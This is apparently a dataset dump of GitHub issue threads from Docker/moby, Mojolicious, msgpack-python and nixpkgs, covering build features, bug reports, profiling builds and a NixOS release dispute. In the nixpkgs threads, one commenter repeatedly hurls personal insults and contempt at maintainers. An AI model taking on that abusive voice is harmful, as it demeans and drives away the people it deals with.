original request.   There is absolutely nothing more I was looking for from this ticket. Ideas that were brought up later like auto-rebasing the include, would be nice features.   But they do go beyond the original ask. Regards, Bill On Thu, 9 Aug 2018 at 1255, Sebastiaan van Stijn notifications@friend.com wrote  @friend Using multi-stage builds for this still requires you to know which files exactly to copy from each image; that's even harder to maintain than copy-pasting the setup code from another image. Of course, merging Docker images is not trivial. Since arbitrary scripts can be run during builds, the build process resists any general attempt of automatic conflict detection; the halting problem says hi!  The best you can do (short of significantly limiting what builds can do) is to define precise semantics say the last / wins (e.g. if they ""write"" the same file) or fail on file-system-level conflict or .... The sometimes stated issue of different ""base"" images (stretch vs ubuntu vs alpine vs ...), however, is simple require that the DAG of image dependencies not only has a single source (the current image) but also a single sink (the shared ""ancestor"" of all images in the ""hierarchy""). Ultimately, of course, you'd get garbage-in-garbage-out -- is it ever different, really? FWIW, my use cases are  Running a Tomcat web application with a PostgreSQL database and an S3 object store.  While this can be solved by using Docker Compose, a single container may be nicer. Multi-language builds run in Docker containers (e.g. on Jenkins, Circle CI, ...).  There are official images for most popular toolchains, but getting a single container equipped to handle more than one runs in exactly the issue discussed here.   @friend , if you need dynamic generation of Dockerfiles  I suggest adding a domain specific language. There are a couple of examples I am aware of   @friend This is not the only option. The right options is to constrain INCLUDEs to avoid big problems. INCLUDEs can't inherit. There it is. Simple. Still incredibly useful. This feature request is popular but Docker is Free as in Beer but not by any means Free as in Freedom.  @friend With the inclusion of buildkit support since 18.06, users can provide their own frontend parser for the builder. There is already an official (from Docker Inc) experimental Dockerfile parser that includes lots of new features (support for secrets for starters). You can of course also add your own ""INCLUDE"" behavior in a custom Dockerfile frontend, or you can do something totally different that's not Dockerfile at all (there's an example for buidpacks). To use a custom frontend, just need to point Docker at an image which can handle it. Do this as a comment on the first line of your Dockerfile (or whatever thing it will be) More details here  buildkit enabled, Docker can build whatever you want it to (doesn't even have to be a Dockerfile format) with whatever features you need.  As offtopic as that note is, I think it should be noted that you are wrong. Thanks to Docker's Apache licensing, everybody has the freedom to fork and develop their own interpreter for Dockerfiles that provides the features developed here. If they are careful, the resulting images will be compatible with existing Docker runtimes/tools. Of course, the maintainers of the Docker project are similarly free to not merge such a feature into their fork (the original?).  @friend That is obviously just meaningless rant without actually referring what is free software. Moby is free software of course.  I did not know it was now Apache licensed. I apologize for the remark and think this is great! Russell Jurney @friend  LI  FB  datasyndrome.com On Wed, Jan 16, 2019 at 417 AM Raphael R. notifications@friend.com wrote  I'm sorry, I didn't sleep well and I made a mistake. My comment stands. Free as in Beer means Apache. Free as in Freedom means community control. An Apache project or some other form of governance. Russell Jurney @friend  LI  FB  datasyndrome.com On Wed, Jan 16, 2019 at 1232 PM Russell Jurney russell.jurney@friend.com wrote  Disagree. Freeware can be proprietary software. What's community control? Projects run by a foundation? So you would consider VS Code, Atom editor, and Ubuntu as non-free software? Then your definition is significantly different from the one proposed by FSF, EFF, and many other organizations. I agree that Docker Inc is not actively discussing with community in this issue, but this has nothing to do with ""Free as in Freedom"".  Sorry folks, let's not have these sorts of discussions on the issue tracker. We have made it possible to support any build format you want to have via . The ""official"" Dockerfile format does not support this option, but that doesn't mean that  can't make use of it. Check out  as an example of building a custom frontend that works with . Note that this frontend is an example of how you can do something completely different from the Dockerfile format, but that is not necessary. You can take the existing Dockerfile format and add your own functionality if you like. As far as adding something into the official Dockerfile format.... I will say proposals are always welcome, the format is maintained in  in mind, though, every new feature means new burden of maintainership, including often limiting what can be done in the future. I think it's likely that many of the use case for combining multiple Dockerfiles can actually be solved with new functionality in Dockerfile... specicially the ability to  and  from arbitrary images.  If this hypothetical INCLUDE could just create the extra containers as an impl detail with me NOT having to give a @#$% it would greatly reduce the amount of frustration surrounding the implicit and dodgy sales pitch of composable containers. I really just want to get back to the application and delivering functionality. Sorry for the the bad vibes, but I am docker/container noob and ran into the same confusion that a lot of other posters have already expressed. ",65,85,642,0,0,496,17,
moby/moby/35447,0.07850521499999999,moby,moby,How to set up Open WRT on Raspbian with docker? Help me please!,1932,13,53,0,2," /kind bug /kind error /sig docker /sig openwrt What happened I can't run this command in Raspberry Pi3 Raspbian docker. docker import  openwrt-x86-generic-rootfs docker images REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE openwrt-x86-generic-rootfs   latest              9015fa51eb3f        48 seconds ago      5.28MB &lt;none&gt;                       &lt;none&gt;              e4205a844e2b        19 minutes ago      5.28MB docker run -i -t openwrt-x86-generic-rootfs /bin/ash standard_init_linux.go195 exec user process caused ""exec format error"" ♠ I just want to Open WRT environment by Raspberry Pi3 on Raspbian with Docker.. What should I do? Anything else we need to know? Environment  Docker version (use ) Client Version      17.10.0-ce API version  1.33 Go version   go1.8.3 Git commit   f4ffd25 Built        Tue Oct 17 191344 2017 OS/Arch      linux/arm  Server  Version      17.10.0-ce  API version  1.33 (minimum version 1.12)  Go version   go1.8.3  Git commit   f4ffd25  Built        Tue Oct 17 190618 2017  OS/Arch      linux/arm  Experimental false  Cloud provider or hardware configuration Raspberry Pi3 on Raspbian  OS (use ) Linux raspberrypi 4.9.59-v7+ #1047 SMP Sun Oct 29 121923 GMT 2017 armv7l GNU/Linux  Kernel (e.g. ) Linux master 4.10.0-37-generic #41~16.04.1-Ubuntu SMP Fri Oct 6 224259 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux  Install tools Docker-CE v17.10  Others  ※ P.S  Could you recommend the way that how to set up Open WRT environment using docker images?  (you can't run x86 binaries on ARM)  Yes, looks like you're trying to run binaries for a different architecture, which won't work. Let me close this issue, because this is not a bug, but feel free to continue the conversation.  Could you recommend the Open WRT Image on my docker environment?  no idea; sounds like a better question for the Open WRT community; this showed up when Googling; ",4,0,103,0,0,143,4,
moby/moby/6604,0.04546087,moby,moby,Container fails to restart after upgrading (from 0.10.1 to 1.0.1) ,251,1,0,0,0,This is likely more informational and nothing actionable now.  It looks like a flag changed and it made it so my container could not start the container (nor did it start upon upgrading) Removing the container and restarting it fixes it; just seems ( ,1,0,5,0,0,3,0,
kraih/mojo/1238,0.065692238,kraih,mojo,delay helper is DEPRECATED,986,4,4,0.5,2," Mojolicious version 7.85 Perl version 5.28.0 Operating system macos  Steps to reproduce the behavior Just just the delay helper. Expected behavior A deprecation warning with explaination what to do, alternative options. How can i replace the helper code with what ? Actual behavior Warnings that delay helper is DEPRECATED. Problem warning without alternative options. User just panics that the code will stop to work one day.  Please use our official support channels.  This discussion is meant to either change/introduce documentation or code. You can mark it as a suggestion, but closing it is not very helpful. For instance, NetOAuth2AuthorizationServer tests upon installation produce many of these warnings, just as an example. It affects other CPAN authors along the way, and web searches should end up here, i suppose.  You did not propose any specific changes that could be discussed here. Until you reach that stage, please use our official support channels for discussions. ",5,0,24,0.25,0.25,38,1,
mojolicious/mojo/1236,0.12186981,mojolicious,mojo,Mojo::File::spurt: Wide character in syswrite,392,4,25,1,0," Mojolicious version 7.87 Perl version v5.26.1 Operating system ubuntu  Steps to reproduce the behavior perl -MMojoFile -le 'MojoFile-&gt;new(q(a.txt))-&gt;spurt(qq(\x{100}))' Expected behavior a.txt written with 2 bytes c4 80 Actual behavior get error Wide character in syswrite at /home/dk/perl5/perlbrew/perls/perl-5.26.1/lib/5.26.1/x86_64-linux/IO/Handle.pm line 483. a.txt is zero bytes ",0,0,46,0,0,15,0,
mojolicious/mojo/1238,0.10402667,mojolicious,mojo,"delay helper is DEPRECATED, but no transition options are given",428,2,3,0,0," Mojolicious version 7.85 Perl version 5.28.0 Operating system macos  Steps to reproduce the behavior Just just the delay helper. Expected behavior A deprecation warning with explaination what to do, alternative options. How can i replace the helper code with what ? Actual behavior Warnings that delay helper is DEPRECATED. Problem warning without alternative options. User just panics that the code will stop to work one day. ",2,0,10,1,0,22,1,
msgpack/msgpack-python/338,0.0671340725,msgpack,msgpack-python,How to increase max_array_len,3389,45,41,0,2,"Hello, I upgraded from 0.5.x to 0.6.x and somewhere in the middle the option max_array_len has been reduced from 2^32 -1 to 128*1024. My application now breaks because the generated lists are too big. Is there any way to set the option from within my application? Something like msgpack.max_array_len = xxx ? Thanks  Why don't you search before asking here? It is written in docstring and document.  See also  Apologies, I did search the code, that's how I was able to pinpoint the issue. I was more looking for a global limit/configuration type of parameter, that I could set externally, like an environment variable.  Do continue on this issue, how do you disable the limits? The documentation states So, is it  or is it ? Additionally, the function signature for  has it specified to defaulting to , which isn't either of the previous values. Does -1 mean 128*1024, or does it mean INT_MAX - 1 (like I'd expect it to). In general, default arguments should be the default value, or none (for cases of mutable values, like list), in which case it is explicitly documented that passing none/-1/whatnot is internally translated to \&lt;default value&gt;.. Basically, the verbiage in the documentation isn't clear how all the options interact, and what values mean what. Additionally, it doesn't really make sense to me to have / etc.... do anything if  is set to 0 (INT_MAX), and having to specify a pile of options just to turn off safety checking for contexts where I'm shipping LARGE chunks of data back and forth between endpoints I control is annoying. I have a context where I pretty regularly have 100+ MByte messages.  Really, if you're going to have checking in place, add another class like  that does this stuff.  There are no way.  msgpack has it's upper bound (2**64).  So  is enough. Do you mean ""is it  or is it ? If  &gt;0, it's . If  == 0 (or other falthy values), it's . This usage of  is very common Python idiom. -1 is default value, and semantics for default value is described already. You don't have to ""specify a pile of options"".  (BTW, I don't think 5 is not ""a pile of"".  You can count it by one hand.) You can just use  (10GB) in such case.  If 10GB is not enough, you can use 100GB (if your machine have 100GB RAM). If I added it, people keep using  for untrusted source.  Security hole is keep living. Anyway, it's too late.  Making weaker than released version is not possible option.  My point was that no, it's not. And you still haven't specified if -1 means  or . Reading the docs page , I can interpret it either way. I mean, if you're writing code, yeah, but it doesn't help in the docs. And the general default value for ""use defaults"" is . Using -1 seems like you're writing C code, not python. If I needed to not specify anything previously, and the functionality is pointless, yes, it is a pile of options. So 0 means , except for , where it means . It'd be nice if 0 meant the same thing when passed to , ,  and . Having them all act differently is a great recipe for confusion. I don't agree this is a problem in the first place.  You might as well just make  return None in all cases, for any input, otherwise someone will figure out how to break something.  msgpack is JSON-like format.  Msgpack can be used anywhere JSON is used. It is used very widely, more than you think. And authenticated or not is not matter. That's why I released 0.6.1. ",11,16,184,0,1,107,6,
NixOS/nixpkgs/1131,0.08491843,NixOS,nixpkgs,Provide `buildGoPackage` function with $GOPATH setuphook,2512,37,16,0,3,"Currently packaging Go software is ugly, see  Anyone working on this?  I can take a stab at this. Here's what I had in mind in terms of usage go-update = buildGoPackage (fetchgit {   url = ""  rev = ""3f04666667"";   sha256 = ""34647689a50b9d12e85a280d9034cc1772079163481c4778ee4b3e6c4b41e2f4""; });  That is, it would merely wrap another derivation. How does that sound? I had an alternative idea that's a little more elaborate go-update = buildGoPackage {   url = ""  rev = ""3f04666667"";   sha256 = ""34647689a50b9d12e85a280d9034cc1772079163481c4778ee4b3e6c4b41e2f4""; };  I could infer the repository type just as  does. I could see value in both approaches - if only I could come up with decent names...  The first one () means that  can never be extended with other function arguments. Do Go packages always come from GitHub? Otherwise it's better to stick to the regular BTW, note that we now have a  function, which is preferable over  because it doesn't pull in Git as a dependency and is probably faster.  Good point. The Go compiler has hard-coded support for Bitbucket, GitHub, Google Code and Launchpad, with the expected url formats documented under ""Remote import paths"". As a side rant, the Go community's lack of discipline around versioning is rather annoying (with the Go compiler reinforcing the ""just pull from master"" attitude, as it doesn't allow for specifying revisions/tags). I have a plan for a ""go2nix"" tool that, given a release date, will traverse the import graph looking for revisions of each dependency as close to the release date as possible, ultimately generating a nix expression. I feel almost dirty suggesting such a thing, but it seems like the most practical approach to Go package automation, given the lack versioned releases... Yes, I was very happy to see that commit the other day - very nice ). I'll hack on this a bit and see what you think.  I wrote a tool to address this go2nix I'll try to get it into nixpkgs soon.  Btw all those symlinks are not needed in the ngrok example. GOPATH can be used instead, but I guess you know already.  @friend ngrok's Makefile expects that it can spit out some source code in it's source tree, so it's actually easier to just dump all the go package sources into the same store path, rather than just having a GOPATH entry for each and needing to special case the ngrok directory. I figure there will be plenty of other projects that behave similarly, so I think it's easier to just pile everything into the same folder.  This is done. ",12,3,105,0,0,65,3,
NixOS/nixpkgs/22340,0.047712754999999996,NixOS,nixpkgs,Build profiling libraries in 'haskellPackages' by default?,8365,94,64,0,3,"Serious Haskell hackers need to profile their code, and that requires special variants of the libraries involved in the build. By default, we don't build those libraries. Should we? If we do, then I see the following options  Provide separate package sets (e.g.  and ) and selectively enable both variants on hydra.nixos.org for appropriate compiler versions, i.e. for the default compiler that's used to build , too. This means that users get the non-profiled package set by default, but they can switch to the profiled package set if they wish to do so. Pros  Users who wish to use profiling can do so. Users who don't profile see no difference, i.e. they don't have to download larger packages or deal with increased closure sizes, etc. Cons  We let  compile every library 5 times (static, dynamic in non-profiling package set, static, dynamic without profiling plus static with profiling in the profiling package set). This is going to slow down our builds, no doubt, and it's also doing to slow down other, non-Haskell builds. The amount of data our binary cache has to store increases by a factor of 2.5, approximately, because we upload the profiled packages in addition to the non-profiled ones. Hard-linking the identical files in both variants won't work because  doesn't produce deterministic binaries across re-builds of the same code.     We can enable profiling by default in our main package set, . Pros  Users who want to profile their code can do so without any manual effort at all -- everything just works. Cons  Hydra has to compile an additional variant of every library, which will increase the build time by a factor of 1.5, approximately.  The disk space and bandwidth requirements on  increase by a factor of ~1.5, too. We increase the build-time and runtime closure size of every dynamically linked Haskell derivation (that is almost all of them) by a factor of ~1.5 for all users, not just for those who care about profiling. That issue could be mitigated by placing profiling libraries into their own derivation output, but it's not clear whether this can be accomplished easily and the corresponding ticket,  has made no progress in the last 2.25 years, so it's not obvious why a working implementation of that feature should pop up out of the blue right now.      Opinions?  This isn't really a community discussion, is it? Whoever is paying for Hydra can decide this unilaterally. Technically, it would probably be possible to modify GHC such that it would output both profiling and non-profiling in once pass, if anyone wanted to do any engineering on it, that is.  I'm in two minds about this At LumiGuide we use option 1. We care about small closure sizes since some of our machines are connected to the internet through mobile links with limited bandwidth. Although option 2 would be simpler and thus more user friendly which IMHO weighs more heavily than our specific requirements. So for me it's a +0.1 for option 2 and I hope  will make progress.  I believe that this is more a question of what the user wants, or rather what we want the user experience to be like. Whether Hydra will cope with the load or not is a subject of speculation. Nobody really knows and we're probably not going to get a definite answer to that question. IMHO, we should chose whatever the best solution is and then try it.  At Takt we use a mixture of options 1 and 2. For all non-Takt code we use option 2, but then for our own code we use option 1 (in fact we go even further We have a package set enabling optimizations for our packages, and another package set disabling them). This has worked quite well for us, because we only have to compile our dependencies once and they will satisfy the needs of any option 1  alternative we might want to use for our own code. With this in mind, I lean towards option 2, as I think it leads to a more rewarding stock experience for users. Those needing smaller closure sizes can tune these things a bit. By the way, besides setting  and  to , we are adding this to our   If we go with 2 plus multiple outputs, we can still get small closures  Your own packages , or over the entire package set? If it's the latter, I really wouldn't want that in ! Almost everything on Hackage should have no profiling information added unless a flag is turned on. The fact that some packages unilaterally export  is a bug of those packages - it just poisons profiling information. But if it's just your own stuff, then of course that makes sense (though I'd still suggest using  in your cabal files, and protecting it with a flag).  @friend I agree with your thoughts. This works well for our use case (although fortunately we don't need to do profiling very often!), but for  we probably don't want these as default.  seems to be useful for stack-traces, though, which maybe is something worth having by default  Still a ""please no"" to that. That's a ton of information in  output, most of which will be outside my control anyway.  Hmm... maybe this highlights a problem, then Seeing as ""enabling profile information"" can mean different things depending on the flags passed to the compiler, does it make sense to provide a profiled Haskell package set at all if it won't satisfy the profiling needs of most people?  The only reason I want a profiling set is so I can compile my code with profiling. Ultimately, any called library code will show up in my own profiling by making my own calls themselves slow. I profile with the attitude of ""vendor code is efficient, my code is inefficient"". Only after ruling out my own code as being problematic do I want to start seeing the gory internals of other code. And even then I gradually opt in and work my way ""down the stack"", so to speak. On Mon, 6 Feb 2017, 634 pm Renzo Carbonara, notifications@friend.com wrote  @friend I can agree with that reasoning 👍  It's hard to decide which one solution is best. After some thought, I lean towards enabling profiling library builds by default in the upcoming  release branch (but not in ). The rationale for that choice is that I assume ""end-user types"", who benefit the most from this change, to be most likely using the release branch rather than following git . People who follow git , on the other hand, I assume to be able to accomplish whatever they need by means of overriding the default configuration. Having profiling enabled by default gives more convenience to normal users, but it's a disadvantage for power users who want to create their own. minimal installations for production. Again, here I assume that those people know how to override the configuration in order to do exactly what they need. I'm sure this is not the best solution, but I can't think of any better one.  Eh, I'm -1 on release branches behaving differently that way. The ""normal user"" ""git master user"" distinction is not one we want to make bigger!  OK, I suppose I won't enable profiling builds on  at all since there is no obvious solution how to do it in a way that's sufficiently beneficial for our users to warrant the costs such a change would incur. I'll leave the ticket open for now, nut I'll remove the  label.  I think option 2 is really the way to go for now. The main drawback is really going to be the increased closure size. @friend highlights a concern here due to the link to deployment machines being a bottleneck, but I wonder - do you compile into a static binary? At CircuitHub we have found the smallest closure is to build a statically linked executable and then strip it. In this case, I'm not sure the inflation of profiling libraries would make a difference, and they would become a development-only cost.  @friend at LumiGuide I recently wrapped all our Haskell executables in  and I was very happy with the results. For our image analysis server  closure size went from 2490.53 MiB to 1668.72 MiB. output size went from 26.70 MiB to 22.87 MiB.  So I don't have a problem anymore with option 2.  If the profiling versions of libs can't be supplied by , I think I've reached a reasonable approach for achieving it manually.  @friend does the recent multiple outputs stuff change things here?  This will make a huge difference. Thanks for sorting this Peti!  It's very good that we now have profiled libraries available from the cache. No need to build our own profiled libraries anymore. Thanks peti!  Oh interesting. ",39,15,259,0,0,151,12,
NixOS/nixpkgs/27244,0.13837179700000002,NixOS,nixpkgs,Cannot comment anymore,2418,38,22,0,1,"Issue description GitHub says ""You can't comment at this time."". Steps to reproduce Comment too much?  I don't think so.  The conversation is unlocked and I haven't seen ability to block particular contributor-thread pairs.  Sometimes I got such errors transiently due to network failures.  Still, there might be stuff I've missed...  @friend I just tried in another random thread opened by @friend and I suspect he has me on his blocked users list. I didn't know that was how the feature worked, but I suspect that's how it works.  @friend As a consequence, he would also not see my @friend. So, if someone could ask him to reconsider would be swell.  Ah, yes, that's probably what's happened.  @friend, you have been blocked from the organization, due to your hostile behaviour towards contributors.  @friend IMO @friend should be unbanned. He/she/they has a really strange and trollish way of talking, but there should be some warnings first, before ban. Perhaps he/she/they were warned already? @friend commenting on your opinion that looks... great! I've looked through some of his reviews, and all of them were on-topic. The way I see it, @friend has a constant 1y+ interest in Nixpkgs/NixOS projects and wants them to be improved, just like me.  I'd personally think that raising this ticket and finding to be banned by an individual member should have been a warning by itself, and a day or two after that there was that ""final"" thread...  I added this user to my personal block list almost exactly a year ago (2016-06-07), where I asked another person in the community to block them. At that time, I noted that they had recently been blocked by other major projects as well. At that time, I asked the other community member I messaged to review some other threads this user had been part of. This resulted in those threads being updated, to remove the nastiness. In my opinion, the most valuable thing we have put together is our welcoming and supportive community. Anything that jeopardizes that jeopardizes the future of NixOS. I don't volunteer my time here to be berated, and I don't think anyone else does, either. I love this community, I deeply appreciate all the hard work from all the hundreds of contributors, and absolutely support @friend's decision to remove people who make it unpleasant to be part of an otherwise top notch group.  Another instance of a negative conversation in a Pull Request ",9,1,97,0,0,53,3,
NixOS/nixpkgs/27258,0.07041209,NixOS,nixpkgs,pbkbfd: Don't use brittle C functions,6442,80,33,0,2," should be using the POSIX 2008  instead of fgets. If, for some reason there are targets that do not have POSIX 2008, add configuration flags to also accommodate for non-POSIX 2008 systems, develop a NixOS module to control this behavior with sane defaults set depending on the platform (which also should be integrated with the installer eventually). (Feel free to create other tickets for these tasks, if need arises.) @friend Version master  I don't use NixOS/nixpkgs anymore, so feel free do do what you want, but with regards to your claim that it should not use ""brittle"" C functions you have to substantiate such claims, i.e. prove what supposedly makes  (which has well defined behaviour) ""brittle"" in this specific context. @friend  Seems to me that if the user enters a NUL, the current code will ignore everything the user enters after the NUL (strlen stops at first NUL, whereas fgets is happy to continue reading until newline). If users feed binary data to this program, the input key passed to the kdf may be substantially shorter than expected. No idea if there are any practical implications re how this program is intended to be used, though.  Correct, but using  won't change that, since the required delimiter would still be a newline. The pbkdf2 wrapper (and that program is nothing more) exists to derive a binary key from a non-binary (human memorable) passphrase + binary (hex encoded) salt. If you already had a binary key, you wouldn't need to use a kdf.  Truncation occurs because of , which  solves by reporting the number of bytes it read.  Presumably, the strength of the derived key would be unaffected by truncation, but it seems recovering the key could accidentally become easier. As long as users never feed strange inputs to the program, there's no problem, but I think it's unfair to discount the potential (whether or not it's worth doing anything about it).  Thanks, I overlooked that; this is a good argument for replacing the + pair with , though as I said, I haven't used this (in a long time) and unless someone else still does you should just drop the whole thing (and keep it from bitrotting further). No, because the derived key is used exclusively for accessing an already encrypted LUKS volume. The input is retrieved via explicit shell prompt at boot time and then fed into the program and you can't enter a null byte on the kernel tty (so you wouldn't use one when setting up the LUKS volume, anyway).  There is a reason I remembered this quote when I read your message.  That's your prerogative, but irrelevant to the issue at hand.  @friend What is the issue at hand according to you? I can imagine that technically and even mathematically there is no problem, but the thing is, I don't even want to read an explanation of an analysis written by in this case the original author. Not because I don't believe it to be correct, but it's because I don't want someone else to also have to understand that analysis in order to believe the code works. It's simply more costly from a maintenance point of view to require such reasoning. Consider that someone wants to call this code from another context and then the whole analysis needs to be done again (and typically is never done and it results in a bug). Also note that you haven't even documented a valid input specification. Really, your code is just a disaster waiting to happen and you apparently need to have this explained multiple times before you get it, and perhaps you will never get it. There are more issues with your code, btw. For example, you make implementation choices when applying an algorithm that are not referenced to scientific literature or with any other kind of justification. In short, I would consider this code written by someone who can instruct a computer what to do, but just lacks the wisdom to tell the computer the right things to do.  The issue is that (as written above) the + pair should be replaced by  iff. it's worth for this project to keep the functionality provided by the semantic block it belongs to. That's not for me to decide, since I don't use it anymore. Again, your prerogative, but not relevant to the issue at hand. That is always the case if one reuses a piece of code in another context. This is not new. That's a mistake of the person reusing C code for another purpose without doing the proper analysis. Of course not, it's an internal component, not part of a public interface. The code will result in disaster when someone abuses an internal component for a different purpose without analysing whether its applicable. Your continued ad hominem attacks (after providing an incomplete bug report) remain irrelevant. That would only be an issue if the derived key was used for something other than decryption of preexisting encryption. As I have pointed out before, your personal attacks serve no purpose with regards to this issue.  @friend The hole you been digging for yourself is now so deep that all I have to do now is to give you a little push. Did you know your C program has undefined behavior?  Since after a civil reminder you insist on keeping up the hostile and - frankly - abuse behaviour, I won't spend more of my time on you )  @friend You are the one who kept insisting that the code was good and that only if others would make a mistake (implying that you are the god of programming) that there would be an issue. Then finally, when I have carefully positioned you such that there is no escape left, you start to cry like a little baby about how hostile I am? You were acting as the most obnoxious person I have ever seen here and you needed to be taught a lesson in humility. The trait most people like you have is that they are unaware of their own limitations and they just keep on sharing their incompetence with the rest of the world. It is pathetic.  @friend I've blocked you from the NixOS organization. This isn't the first time you've engaged in personal attacks on contributors, and I've had enough.  @friend Don’t let that behaviour get to you; the person suddenly appeared a few days ago (see their profile) and started commenting hundreds of issues/PRs, always with a doubtful attitude. I wasn’t sure what to make of it because it seemed like they were contributing, but apparently they just wanted to burn stuff. Nothing gained nothing lost I’d say.  I approve @friend actions, FYI. @friend you're very welcome to reopen the PR, I'll review it shortly. ",24,17,189,0,0,124,3,
NixOS/nixpkgs/31045,0.299854925,NixOS,nixpkgs,Release quality 17.09,19212,231,127,0,4,"At NixCon 2017 it appeared as if the release managers thought their release went well. Via this message I would like to provide some data to the contrary. I tried to upgrade on two different machines to 17.09 and none of them worked without reconfiguration or without removing features. As such I am still stuck at 17.03 on both and haven't bothered upgrading other machines. For example  Skype doesn't work anymore (broken download) Flash failed (has been fixed, but by the time 10 people have discovered it, you already failed) NFS with autofs or systemd doesn't work due to a missing symbol (open for months)  It is great that doing a rollback was possible (although it does restart the network connection, which would result in some downtime on production infrastructure), but as far as I am concerned no working 17.09 release with feature parity from 17.03 has been released. I am also not happy with the discontinued support of 32 bits code when other distributions still support newer 32 bits code. Not sure whether this is specific to 17.09. There are just a small number of critical packages that tens of millions of people use of which Skype and Flash are an example. NFS is used by a lot of businesses and as such should also be considered important. I don't understand how one can make a release without systematically creating tests based on e.g. Debian's popcon download measures to see whether a package still works. If a release has any QA done on it, I have missed it. What is the point of tagging some git version as a release when the QA on it is non-existent?  Flash and Skype in Debian's popcon? -)  I must say our QA for unfree packages is inherently worse just because of the policy not to allow building such packages on the build farm.  To remain positive, QA done specifically for the release   A critical test-set is checked before every channel bump, too, though it would certainly be nice to have more tests.  You may have noticed a couple proposals around tests on NixCon 2017.  Hi there! Yes, indeed, we are quite proud of our release. We merged thousands of pull requests, addressed many many issues, added lots of services and packages, and included many security updates. Our community has also grown quite a lot, and we are proud and excited by the growth and progress of NixOS. You've had a less good experience, and that sucks. It seems you fall in to somewhat less tested areas of NixOS, and that is certain to expose you to sharper corners and more broken things. I'm sorry you  did! Please try upgrading your remaining machines, as 17.03 is no longer supported. We'd rather dedicate everyone's efforts to making 17.09 work sufficiently well. It seems that two of your issues are with unfree software, which NixOS doesn't officially test in any capacity. This is by policy, so any sort of testing on these packages will have to be by volunteer contributors on their own time and hardware. If you'd like to help with this, I'd be happy to work with you to help set something up. Your third issue about NFS NFS with autofs or systemd doesn't work due to a missing symbol (open for months)  Luckily, it seems one of our volunteer contributors has a patch! Maybe you could try it out on your system, and reply to the PR  I don't see an issue about this. Can you open one? When I call , I don't have this issue ... Hmm... Unfortunately NixOS is a small distribution without substantial corporate backing. We still support and build some software for i686, but as you say, we no longer support entire i686 systems. It was a very difficult choice, as we didn't want to leave users without updates, but we believe it was worth the decision. x86_64 has been available for 17 years now and covers almost all of the modern hardware. Dropping i686 support has significantly improved our ability to test and release NixOS. What were you using i686 for? Regarding NFS We have automatic testing of NFS 3 and NFS 4, which pass   tests automatically create servers and clients and run thorough tests to ensure our NFS support works. I think that is pretty good, and pretty cool! However, it doesn't cover the autofs case. Perhaps we should add that to the test? Would you like to send a PR adding it? If so, I'd be happy to do an IRC chat or video call to help you. Maybe you're not familiar with the extensive, innovative automatic VM testing we already do? I think it is pretty cool, and many distros don't have as robust of a test framework we do. Please remember that NixOS is operated by a very wonderful group of volunteers, and your negativity isn't welcome. If you would like to learn about our release proceses, we'd be happy to show and teach you. If you would like to learn about our QA process, we'd be happy to show and teach you. If you would like to become a contributor and help scratch your own itches, make NixOS as good as it can be for your use cases, we'd be happy to show and teach you. If you would like to contribute enough money to hire a team of full time people to work on and support NixOS, we'd be happy to work with you. Thank you, Graham Christensen  I'm pretty sure I cannot add much to @friend's awesome response, except to say we're sorry that you had issues and want to emphasize that we try to deliver the best experience possible but sadly don't have infinite resources and even by far not as many as debian etc.  Updated the nixpkgs manual and the wiki that we cannot test or build unfree packages.  @friend I upgraded one server to 17.09. Another system upgrade broke idempotency. That is, . It is my understanding that the NixOS organization claims to achieve the opposite. The i686 device is an end user laptop. If it runs a browser (don't care which one as long as it is graphical) and an ssh client. Regarding your tests, I took a look at one of your links and found a build with a green checkmark which said (  ) to me that says that the QA on the tests themselves is lacking. One of the prerequisites for testing an application is a working system. That is already not working here, so at that point I stopped reading output. While everyone hearts your reaction, this self congratulatory attitude seems overly positive. Perhaps I have different metrics regarding success, though. For example, you count thousands of PRs being merged as an achievement. I count the work of e.g. Ericson2314 as one feature of interest (if it works) despite it being spread out over many PRs. As a leadership principle, undesired behavior should not be encouraged. By celebrating a meaningless metric like the number of merged updates, you only achieve tired contributors (because pressing a merge button cannot possibly be more boring), who at some point will be bored and stop. When people dig a tunnel with a teaspoon you are the one cheering to the team, while I am there thinking why don't they call 3M? Your message about my ""negativity not being welcome"" seems to be straight from SJW hell. While Nix and NixOS do some things pretty good, there is also a lot of stuff which is terrible. Implying you only want ""happy thoughts"" essentially is not leadership, it's a culture suited for the gulags. When someone throws shit in your face, are you also going to describe it as a warm welcome gift? I am not sure whether this is an American thing, but I can assure you that it is not normal to take criticism this badly. In short, your message is more passive aggressive than it should receive a heart. In the future stick to the facts please. The facts are that 17.09 was not ready for use, even today. @friend You are allowed to test and build unfree packages in a lot of cases. Redistributing the resulting builds just is not always allowed. But distributing the recipe for building something and claiming you have followed that recipe and ended up with something that works is perfectly fine. There are a few database vendors which say that you cannot publish benchmarks, but simply saying that you cannot do it, is just lying. Perhaps you don't want to do it or you have no interest in it. Perhaps there is nobody in the entire community interested in it. That still doesn't mean that it cannot be done. So, building a piece of software and then not distributing it to entities who are not a member of the NixOS organisation is perfectly legal. This particular contribution to the manual is of negative value, because it doesn't reference any policy and provides no legal reason. As such, you have just inflated the size of the manual prematurely and someone else (me in this case) needs to point out the fact that you need to redo it again.  Upgrade broke idempotency Could you please elaborate what broke for you? Did you open an issue for that? Claiming something broke without mentioning what or any further explanation is not polite. Why? What are the issues that should be fixed in your opinion? You can't expect everything to be bug-free, even with extensive testing in place. Just look at other community-driven distributions for a reference. Errors happen, may they be in the code or in its tests. nfs4 NixOS Test This could be a bug in the test that nobody noticed before. We should fix that but that doesn't mean that all NixOS tests and their QA are inherently inadequate. Even though the kernel printed a stack trace the VM seemed to work fine. I can't pinpoint an actual cause for the stack trace after a quick look. Unfree packages Our CI system is not able to build packages without pushing it to the binary cache at cache.nixos.org. This would require some code changes. You're free to implement this. As nobody has done this yet or opened an issue that I know of there doesn't seem to be much interest in it. I don't agree that the manual change is useless and that I am lying. It just clarifies that we can't support unfree software unless we look at each license/EULA on a case-by-case basis (""most""). This is the legal reason. If you have a suggestion to improve the wording, please do send it to me or open a PR. You're also welcome to help to add license abstractions for unfree software that we can build, distribute or run. We're just putting everything in the unfree category so we don't have to deal with that. Personally, I'm not interested in improving the unfree packages situation in my spare time and any help is appreciated.  Unfree packages I don't see it as being that much about legal reasons but about current policy for the build farm &ndash; it disallows building ""unfree"" packages and now it's explicitly written down in docs.  Note that many distributions don't even allow them into the main repository.  I'm personally not too motivated by them, but if enough people are interested, surely they can put together a Hydra instance doing the additional unfree tests (and write them first, actually ). Negativity I'm personally not at all against criticizing etc. but it seems only useful if it's done in a ""productive way"", i.e. focused on fixing those problems.  For example, you claimed that idempotency got broken but you provided almost no information about it (so 